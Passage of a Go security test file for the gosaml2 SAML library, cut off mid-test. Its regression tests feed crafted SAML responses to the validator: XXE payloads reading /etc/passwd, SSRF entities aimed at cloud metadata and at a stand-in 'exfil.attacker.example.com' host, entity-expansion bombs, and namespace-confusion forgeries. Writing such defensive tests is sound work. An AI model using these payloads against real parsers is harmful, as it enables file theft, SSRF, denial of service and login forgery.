// Copyright 2025 Russell Haering et al.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sp

import (
	"bytes"
	"compress/flate"
	"context"
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"net/url"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/russellhaering/gosaml2/v2/types"
	"github.com/stretchr/testify/require"
)

// samlResponseTemplate builds a complete SAML response XML string with optional
// injections. This helper keeps the individual test bodies concise.
func samlResponseTemplate(sp *ServiceProvider, nameID string) string {
	now := sp.now()
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0" IssueInstant="%s">
    <saml2:Issuer>%s</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID>%s</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml2:AudienceRestriction><saml2:Audience>%s</saml2:Audience></saml2:AudienceRestriction>
    </saml2:Conditions>
    <saml2:AuthnStatement AuthnInstant="%s" SessionIndex="_session_1">
      <saml2:AuthnContext>
        <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
      </saml2:AuthnContext>
    </saml2:AuthnStatement>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL,
		now.Format(time.RFC3339),
		sp.IDPEntityID,
		now.Format(time.RFC3339),
		sp.IDPEntityID,
		nameID,
		now.Add(5*time.Minute).Format(time.RFC3339),
		sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339),
		now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0],
		now.Format(time.RFC3339),
	)
}

// ============================================================================
// Category 2: XML Parsing / Entity / Encoding Security Tests (55 tests)
// ============================================================================

// ---------------------------------------------------------------------------
// XXE Tests (1-5)
// ---------------------------------------------------------------------------

func TestSecurityXML_XXE_ClassicFileEntity(t *testing.T) {
	// Test 1: Classic XXE file:///etc/passwd in response body.
	// Go's encoding/xml does not resolve external entities, and the
	// rtvalidator rejects DOCTYPE declarations. This is a regression test.
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "XXE with file:///etc/passwd should be rejected")
	t.Logf("Correctly rejected XXE file entity: %v", err)
}

func TestSecurityXML_XXE_InEncryptedAssertionPlaintext(t *testing.T) {
	// Test 2: DOCTYPE in what would be decrypted XML.
	// Even if an attacker could control decrypted plaintext, parseResponse
	// (called on decrypted bytes) should reject DOCTYPE declarations.
	xmlWithDoctype := `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer>&xxe;</saml2:Issuer>
</saml2:Assertion>`

	_, _, err := parseResponse([]byte(xmlWithDoctype), 0)
	require.Error(t, err, "DOCTYPE in decrypted assertion plaintext should be rejected by rtvalidator")
	t.Logf("Correctly rejected DOCTYPE in decrypted plaintext: %v", err)
}

func TestSecurityXML_XXE_ParameterEntity(t *testing.T) {
	// Test 3: XXE via parameter entity (%xxe;).
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY %% xxe SYSTEM "file:///etc/passwd"> %%xxe;]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "XXE via parameter entity should be rejected")
	t.Logf("Correctly rejected parameter entity XXE: %v", err)
}

func TestSecurityXML_XXE_PublicIdentifier(t *testing.T) {
	// Test 4: XXE via PUBLIC identifier.
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe PUBLIC "-//W3C//TEXT evil//EN" "http://evil.example.com/xxe">]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "XXE via PUBLIC identifier should be rejected")
	t.Logf("Correctly rejected PUBLIC identifier XXE: %v", err)
}

func TestSecurityXML_XXE_XInclude(t *testing.T) {
	// Test 5: XXE via XInclude (xi:include).
	// Go's XML parser does not process XInclude, but we verify it does not
	// resolve the included file and the response fails validation.
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:xi="http://www.w3.org/2001/XInclude"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0" IssueInstant="%s">
    <saml2:Issuer>%s</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID><xi:include href="file:///etc/passwd" parse="text"/></saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml2:AudienceRestriction><saml2:Audience>%s</saml2:Audience></saml2:AudienceRestriction>
    </saml2:Conditions>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID,
		now.Add(5*time.Minute).Format(time.RFC3339), sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0])

	// Even if parsing succeeds, the NameID will be empty (XInclude is not
	// processed), and signature validation will fail. Either way, the attack
	// is neutralized.
	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "XInclude-based XXE should not produce a valid response")
	t.Logf("Correctly rejected XInclude XXE: %v", err)
}

// ---------------------------------------------------------------------------
// SSRF via XXE Tests (6-8)
// ---------------------------------------------------------------------------

func TestSecurityXML_SSRF_CloudMetadata(t *testing.T) {
	// Test 6: SSRF targeting cloud metadata endpoint.
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "SSRF via cloud metadata XXE should be rejected")
	t.Logf("Correctly rejected cloud metadata SSRF: %v", err)
}

func TestSecurityXML_SSRF_DNSExfiltration(t *testing.T) {
	// Test 7: SSRF DNS exfiltration via entity pointing to attacker domain.
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://exfil.attacker.example.com/steal?data=secret">]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "SSRF via DNS exfiltration XXE should be rejected")
	t.Logf("Correctly rejected DNS exfiltration SSRF: %v", err)
}

func TestSecurityXML_SSRF_InternalService(t *testing.T) {
	// Test 8: SSRF targeting internal services (localhost:8080).
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin/secret">]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "SSRF via internal service XXE should be rejected")
	t.Logf("Correctly rejected internal service SSRF: %v", err)
}

// ---------------------------------------------------------------------------
// Entity Expansion Bomb Tests (9-12)
// ---------------------------------------------------------------------------

func TestSecurityXML_BillionLaughs(t *testing.T) {
	// Test 9: Billion Laughs (chain of 10 entities each referencing previous 10x).
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">&lol9;</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Billion Laughs entity expansion bomb should be rejected")
	t.Logf("Correctly rejected Billion Laughs: %v", err)
}

func TestSecurityXML_QuadraticBlowup(t *testing.T) {
	// Test 10: Quadratic Blowup (single large entity referenced 1000x).
	sp, _ := securityTestSP(t)

	largeString := strings.Repeat("A", 50000)
	refs := strings.Repeat("&boom;", 1000)
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY boom "%s">]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, largeString, sp.ACSURL, refs)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Quadratic blowup entity expansion should be rejected")
	t.Logf("Correctly rejected quadratic blowup: %v", err)
}

func TestSecurityXML_RecursiveEntityExpansion(t *testing.T) {
	// Test 11: Recursive entity expansion (circular references).
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "&b;">
  <!ENTITY b "&a;">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">&a;</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Recursive entity expansion should be rejected")
	t.Logf("Correctly rejected recursive entities: %v", err)
}

func TestSecurityXML_EntityExpansionInAttributes(t *testing.T) {
	// Test 12: Entity expansion in attribute values.
	sp, _ := securityTestSP(t)

	maliciousXML := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY boom "EVIL_DESTINATION">]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="&boom;" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Entity expansion in attributes should be rejected")
	t.Logf("Correctly rejected entity expansion in attributes: %v", err)
}

// ---------------------------------------------------------------------------
// CDATA Tests (13-15)
// ---------------------------------------------------------------------------

func TestSecurityXML_CDATA_XMLMarkupInNameID(t *testing.T) {
	// Test 13: CDATA section containing XML markup in NameID.
	// CDATA is valid XML; the parser should treat it as text content.
	// If parsing succeeds, the NameID value must contain the literal text.
	sp, _ := securityTestSP(t)

	resp := samlResponseTemplate(sp, "<![CDATA[<evil>markup</evil>]]>")

	_, el, err := parseResponse([]byte(resp), 0)
	if err != nil {
		t.Logf("Parser rejected CDATA in NameID (acceptable): %v", err)
		return
	}

	decodedResponse := &types.Response{}
	err = xmlUnmarshalElement(el, decodedResponse)
	if err != nil {
		t.Logf("Unmarshal rejected CDATA in NameID (acceptable): %v", err)
		return
	}

	if len(decodedResponse.Assertions) > 0 {
		nameID := decodedResponse.Assertions[0].Subject.NameID.Value
		// CDATA content is literal text. The angle brackets should appear as
		// characters in the string value, not be interpreted as XML elements.
		require.Contains(t, nameID, "<evil>markup</evil>",
			"CDATA content should be preserved as literal text")
		t.Logf("CDATA NameID value: %q", nameID)
	}
}

func TestSecurityXML_CDATA_SplitAcrossElements(t *testing.T) {
	// Test 14: CDATA section splitting across elements.
	// This tests that CDATA does not allow element boundary crossing.
	sp, _ := securityTestSP(t)

	resp := samlResponseTemplate(sp, "<![CDATA[part1]]>middle<![CDATA[part2]]>")

	_, el, err := parseResponse([]byte(resp), 0)
	if err != nil {
		t.Logf("Parser rejected split CDATA (acceptable): %v", err)
		return
	}

	decodedResponse := &types.Response{}
	err = xmlUnmarshalElement(el, decodedResponse)
	if err != nil {
		t.Logf("Unmarshal rejected split CDATA: %v", err)
		return
	}

	if len(decodedResponse.Assertions) > 0 {
		nameID := decodedResponse.Assertions[0].Subject.NameID.Value
		// All text should be concatenated
		require.Equal(t, "part1middlepart2", nameID,
			"Split CDATA sections should be concatenated as text")
		t.Logf("Split CDATA NameID value: %q", nameID)
	}
}

func TestSecurityXML_CDATA_InCipherValueWrapper(t *testing.T) {
	// Test 15: CDATA wrapping what looks like CipherValue content.
	// This verifies CDATA does not bypass element parsing in encrypted elements.
	maliciousXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <FakeCipherValue><![CDATA[AAAA]]></FakeCipherValue>
</saml2p:Response>`

	_, el, err := parseResponse([]byte(maliciousXML), 0)
	if err != nil {
		t.Logf("Parser rejected CDATA in cipher wrapper (acceptable): %v", err)
		return
	}

	// Verify CDATA content is just text
	decodedResponse := &types.Response{}
	err = xmlUnmarshalElement(el, decodedResponse)
	require.NoError(t, err, "Valid XML with CDATA should still unmarshal")
	t.Logf("CDATA in CipherValue-like wrapper correctly treated as text")
}

// ---------------------------------------------------------------------------
// Namespace Confusion Tests (16-21)
// ---------------------------------------------------------------------------

func TestSecurityXML_NamespacePrefixRemapping(t *testing.T) {
	// Test 16: Namespace prefix remapping (evil:Assertion instead of saml2:Assertion).
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <evil:Assertion xmlns:evil="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0" IssueInstant="%s">
    <evil:Issuer>%s</evil:Issuer>
    <evil:Subject>
      <evil:NameID>attacker@evil.com</evil:NameID>
      <evil:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <evil:SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </evil:SubjectConfirmation>
    </evil:Subject>
    <evil:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <evil:AudienceRestriction><evil:Audience>%s</evil:Audience></evil:AudienceRestriction>
    </evil:Conditions>
  </evil:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID,
		now.Add(5*time.Minute).Format(time.RFC3339), sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0])

	// The response is unsigned so it must fail signature validation.
	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Remapped namespace prefix should not bypass validation")
	t.Logf("Correctly rejected namespace prefix remapping: %v", err)
}

func TestSecurityXML_DefaultNamespaceOverride(t *testing.T) {
	// Test 17: Default namespace override on Assertion element.
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer>%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <Assertion xmlns="http://evil.example.com/fake-saml" ID="_a1" Version="2.0" IssueInstant="%s">
    <Issuer>%s</Issuer>
    <Subject>
      <NameID>attacker@evil.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="%s" NotOnOrAfter="%s">
      <AudienceRestriction><Audience>%s</Audience></AudienceRestriction>
    </Conditions>
  </Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID,
		now.Add(5*time.Minute).Format(time.RFC3339), sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0])

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Default namespace override with fake URI should not produce valid assertions")
	t.Logf("Correctly rejected default namespace override: %v", err)
}

func TestSecurityXML_NamespaceUndeclaration(t *testing.T) {
	// Test 18: Namespace undeclaration via empty default namespace.
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer>%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2:Assertion xmlns:saml2="" ID="_a1" Version="2.0" IssueInstant="%s">
    <saml2:Issuer>%s</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID>attacker@evil.com</saml2:NameID>
    </saml2:Subject>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Namespace undeclaration should cause failure")
	t.Logf("Correctly rejected namespace undeclaration: %v", err)
}

func TestSecurityXML_NamespaceRedefinitionBetweenSigningAndUnmarshaling(t *testing.T) {
	// Test 19: Namespace redefinition between signing and unmarshaling.
	// The outer element declares saml2 as the assertion namespace but a child
	// redefines it to a different URI.
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer>%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2:Assertion ID="_a1" Version="2.0" IssueInstant="%s">
    <saml2:Issuer xmlns:saml2="http://evil.example.com/redefined">%s</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID>attacker@evil.com</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml2:AudienceRestriction><saml2:Audience>%s</saml2:Audience></saml2:AudienceRestriction>
    </saml2:Conditions>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID,
		now.Add(5*time.Minute).Format(time.RFC3339), sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0])

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Namespace redefinition should cause validation failure")
	t.Logf("Correctly rejected namespace redefinition: %v", err)
}

func TestSecurityXML_DuplicateNamespaceDeclarations(t *testing.T) {
	// Test 20: Duplicate namespace declarations with different URIs.
	// XML parsers should reject or only use the last declaration.
	maliciousXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
    xmlns:saml2="http://evil.example.com/duplicate"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer>test</saml2:Issuer>
</saml2p:Response>`

	_, _, err := parseResponse([]byte(maliciousXML), 0)
	// Duplicate namespace attributes are technically invalid XML. The parser
	// or rtvalidator should reject or at least not be confused by them.
	if err != nil {
		t.Logf("Correctly rejected duplicate namespace declarations: %v", err)
	} else {
		// If the parser accepts it, verify it does not use the evil namespace
		t.Log("Parser accepted duplicate namespace declarations; verify no confusion occurs")
	}
}

func TestSecurityXML_NamespacePrefixOnSignature(t *testing.T) {
	// Test 21: Namespace prefix on Signature matching Response prefix.
	// An attacker might try to hide a fake signature under the same prefix.
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
    xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer>%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2p:Signature><saml2p:SignedInfo>fake</saml2p:SignedInfo></saml2p:Signature>
  <saml2:Assertion ID="_a1" Version="2.0" IssueInstant="%s">
    <saml2:Issuer>%s</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID>attacker@evil.com</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml2:AudienceRestriction><saml2:Audience>%s</saml2:Audience></saml2:AudienceRestriction>
